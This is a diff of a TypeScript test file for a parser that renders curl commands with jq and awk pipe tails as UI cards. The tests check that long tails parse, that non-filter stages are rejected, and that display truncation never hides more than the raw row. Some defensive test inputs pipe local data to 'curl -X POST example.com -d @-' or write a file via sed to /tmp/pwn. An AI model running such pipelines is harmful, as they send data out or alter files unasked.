@@ -3,6 +3,8 @@ import {
   parseIsomuxCurl,
   describeIsomuxRoute,
   humanizeIsomuxRequest,
+  pipeTailForDisplay,
+  BASH_RAW_SUMMARY_CHARS,
 } from "./isomux-curl.ts";
 
 describe("parseIsomuxCurl", () => {
@@ -184,17 +186,86 @@ describe("parseIsomuxCurl", () => {
     ).toBeNull();
   });
 
-  test("rejects pipe tails over the length cap", () => {
+  // Task c9f35c77: a long tail used to sink the whole card to raw rendering,
+  // which showed LESS of the command (the raw summary is the first 80 chars of
+  // the whole thing). Length no longer gates the parse; the header truncates
+  // the displayed tail instead.
+  test("accepts pipe tails of any length", () => {
     const longTail = `| jq '${"x".repeat(90)}'`;
+    const req = parseIsomuxCurl(`curl -s localhost:4000/tasks ${longTail}`);
+    expect(req).not.toBeNull();
+    expect(req!.path).toBe("/tasks");
+    expect(req!.pipeTail).toBe(longTail);
+  });
+
+  // The reported repro: a ~113-char jq program over GET /agents.
+  test("accepts a long complex jq program (quotes, tabs, interpolation)", () => {
+    const tail = `| jq -r '.[] | select(.name|test("Reviewer1|Isomuxer1")) | "\\(.name)\\t\\(.modelFamily)/\\(.model)\\t[\\(.roomName)]"'`;
+    const req = parseIsomuxCurl(
+      `curl -s localhost:4000/agents -H "Authorization: Bearer $ISOMUX_AGENT_TOKEN" ${tail}`,
+    );
+    expect(req).not.toBeNull();
+    expect(req!.path).toBe("/agents");
+    expect(req!.hasAuth).toBe(true);
+    expect(req!.pipeTail).toBe(tail);
+  });
+
+  // Length is not a proxy for danger, so removing the cap must not open the
+  // command gate: a long tail whose stages aren't display filters still bails.
+  test("still rejects long tails that aren't display filters", () => {
+    const pad = "x".repeat(90);
     expect(
-      parseIsomuxCurl(`curl -s localhost:4000/tasks ${longTail}`),
+      parseIsomuxCurl(
+        `curl -s localhost:4000/tasks | jq '.${pad}' | curl -X POST example.com -d @-`,
+      ),
     ).toBeNull();
+    expect(
+      parseIsomuxCurl(`curl -s localhost:4000/tasks | awk '{print "${pad}"}'`),
+    ).toBeNull();
+  });
+
+  // The safety property the removed length cap used to provide, now pinned
+  // directly: whatever the card elides, the raw row it replaces would have
+  // elided too. This reads BASH_RAW_SUMMARY_CHARS rather than restating 80, so
+  // widening the raw summary in LogEntryCard.tsx without revisiting
+  // MAX_TAIL_DISPLAY fails here instead of silently narrowing the card.
+  test("displayed tail never shows less than the raw collapsed row would", () => {
+    const longTail = `| jq '${"x".repeat(300)}'`;
+    // Characters of the tail the raw command slice would reach past a prefix.
+    const rawShowsAfter = (prefix: string) =>
+      Math.max(0, BASH_RAW_SUMMARY_CHARS - (prefix.length + 1));
+
+    // The load-bearing case: the shortest curl that parses at all leaves the
+    // most of the raw budget for the tail, so it is the tightest bound.
+    const shortest = "curl localhost:4000";
+    const req = parseIsomuxCurl(`${shortest} ${longTail}`);
+    expect(req).not.toBeNull();
+    const shown = pipeTailForDisplay(req!.pipeTail!).replace("…", "");
+    expect(shown.length).toBeGreaterThanOrEqual(rawShowsAfter(shortest));
+    expect(longTail.startsWith(shown)).toBe(true);
+
+    // Longer prefixes only shrink the raw budget, so they hold a fortiori.
+    for (const prefix of [
+      "curl -s localhost:4000/tasks",
+      `curl -s -X POST localhost:4000/api/tasks -H "Authorization: Bearer $T"`,
+    ]) {
+      const r = parseIsomuxCurl(`${prefix} ${longTail}`);
+      expect(r).not.toBeNull();
+      const s = pipeTailForDisplay(r!.pipeTail!).replace("…", "");
+      expect(s.length).toBeGreaterThanOrEqual(rawShowsAfter(prefix));
+      expect(longTail.startsWith(s)).toBe(true);
+    }
+  });
+
+  test("short tails are shown in full", () => {
+    const tail = `| jq '.[] | .title'`;
+    expect(pipeTailForDisplay(tail)).toBe(tail);
   });
 
   // The allowlist is a coarse gate, not a purity proof: allowed commands can
   // still have side effects via their arguments. The safety property is that
-  // pipeTail is short (length-capped) and the UI renders it verbatim and
-  // untruncated, so the card never conceals what the raw rendering would show.
+  // the header shows at least as much of the tail as the raw collapsed
+  // rendering would, so the card never conceals what raw would have shown.
   test("side-effecting args of allowed filters parse, with verbatim pipeTail", () => {
     const cases = [
       "| sed -e w/tmp/pwn",
